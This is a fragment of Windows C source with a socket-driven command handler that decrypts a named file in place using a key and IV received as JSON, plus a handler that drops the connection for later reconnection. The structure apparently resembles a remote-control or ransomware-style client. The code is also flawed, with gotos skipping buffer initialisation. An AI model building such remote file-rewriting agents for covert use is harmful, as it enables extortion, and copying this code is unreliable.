        DEBUG_PRINT("Failed to convert path to WCHAR for decryption.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Path conversion failed.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        return;
    }

    // Create a temporary file for the decrypted content
    wchar_t tempPathW[MAX_PATH];
    if (!GetTempFileNameW(L".", L"dec", 0, tempPathW)) {
        DEBUG_PRINT("Failed to create temporary file for decryption.");
        cJSON* response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "status", "failed");
        cJSON_AddStringToObject(response, "message", "Failed to create temporary file.");
        SendJsonRequest(sock, response);
        cJSON_Delete(response);
        free(pathW);
        return;
    }

    FILE* inFile = NULL;
    FILE* outFile = NULL;
    BOOL success = FALSE;
    char responseMessage[256] = {0};
    
    errno_t err = _wfopen_s(&inFile, pathW, L"rb");
    if (err != 0 || !inFile) {
        sprintf_s(responseMessage, sizeof(responseMessage), "Failed to open source file for reading.");
        DEBUG_PRINT("Failed to open source file for reading: %ls", pathW);
        goto cleanup_decrypt;
    }

    err = _wfopen_s(&outFile, tempPathW, L"wb");
    if (err != 0 || !outFile) {
        sprintf_s(responseMessage, sizeof(responseMessage), "Failed to open temp file for writing.");
        DEBUG_PRINT("Failed to open temp file for writing: %ls", tempPathW);
        goto cleanup_decrypt;
    }

    // Initialize AES context
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    
    // Convert key and IV strings to bytes
    const BYTE* keyBytes = (const BYTE*)keyItem->valuestring;
    const BYTE* ivBytes = (const BYTE*)ivItem->valuestring;
    DWORD keyLen = (DWORD)strlen(keyItem->valuestring);
    DWORD ivLen = (DWORD)strlen(ivItem->valuestring);
    
    // Initialize AES key
    if (!InitAESKey(&hProv, &hKey, keyBytes, keyLen, ivBytes)) {
        sprintf_s(responseMessage, sizeof(responseMessage), "Failed to initialize AES key.");
        DEBUG_PRINT("Failed to initialize AES key.");
        goto cleanup_decrypt;
    }
    
    // Process file in chunks
    const size_t CHUNK_SIZE = 64 * 1024; // 64KB chunks
    BYTE* readBuffer = (BYTE*)malloc(CHUNK_SIZE);
    BYTE* cryptoBuffer = (BYTE*)malloc(CHUNK_SIZE + AES_BLOCK_SIZE); // Extra space for padding
    
    if (!readBuffer || !cryptoBuffer) {
        sprintf_s(responseMessage, sizeof(responseMessage), "Memory allocation failed for buffers.");
        DEBUG_PRINT("Memory allocation failed for buffers.");
        goto cleanup_decrypt;
    }

    size_t bytesRead;
    BOOL finalBlock = FALSE;
    
    while (!finalBlock && (bytesRead = fread(readBuffer, 1, CHUNK_SIZE, inFile)) > 0) {
        DWORD cryptoLen = (DWORD)bytesRead;
        
        // Check if this is the final block
        if (feof(inFile)) {
            finalBlock = TRUE;
        }
        
        // Copy data to crypto buffer
        memcpy(cryptoBuffer, readBuffer, bytesRead);
        
        // Decrypt the chunk
        if (!CryptDecrypt(hKey, 0, finalBlock, 0, cryptoBuffer, &cryptoLen)) {
            sprintf_s(responseMessage, sizeof(responseMessage), "AES decryption failed.");
            DEBUG_PRINT("AES decryption failed for file: %ls", pathW);
            goto cleanup_decrypt;
        }
        
        // Write decrypted data to output file
        if (fwrite(cryptoBuffer, 1, cryptoLen, outFile) != cryptoLen) {
            sprintf_s(responseMessage, sizeof(responseMessage), "Failed to write decrypted data to temp file.");
            DEBUG_PRINT("Failed to write decrypted data to temp file: %ls", tempPathW);
            goto cleanup_decrypt;
        }
    }

    success = TRUE;
    strcpy_s(responseMessage, sizeof(responseMessage), "File decrypted successfully.");
    DEBUG_PRINT("File decrypted successfully: %ls", pathW);

cleanup_decrypt:
    if (readBuffer) free(readBuffer);
    if (cryptoBuffer) free(cryptoBuffer);
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    if (inFile) fclose(inFile);
    if (outFile) fclose(outFile);
    
    if (success) {
        // Replace original file with decrypted version
        if (_wremove(pathW) != 0) {
            sprintf_s(responseMessage, sizeof(responseMessage), "Failed to remove original file.");
            DEBUG_PRINT("Failed to remove original file: %ls", pathW);
            success = FALSE;
        } else if (_wrename(tempPathW, pathW) != 0) {
            sprintf_s(responseMessage, sizeof(responseMessage), "Failed to rename temp file to original.");
            DEBUG_PRINT("Failed to rename temp file to original: %ls -> %ls", tempPathW, pathW);
            success = FALSE;
        }
    } else {
        // Clean up temp file on failure
        _wremove(tempPathW);
    }
    
    cJSON* response = cJSON_CreateObject();
    cJSON_AddStringToObject(response, "status", success ? "success" : "failed");
    cJSON_AddStringToObject(response, "message", responseMessage);
    SendJsonRequest(sock, response);
    cJSON_Delete(response);
    free(pathW);
}
static void handle_restart_connection(SOCKET sock, cJSON* commandJson) {
    DEBUG_PRINT("Received restart command. Closing connection.");
    closesocket(sock);
    // The main loop in main.c will handle reconnection.
}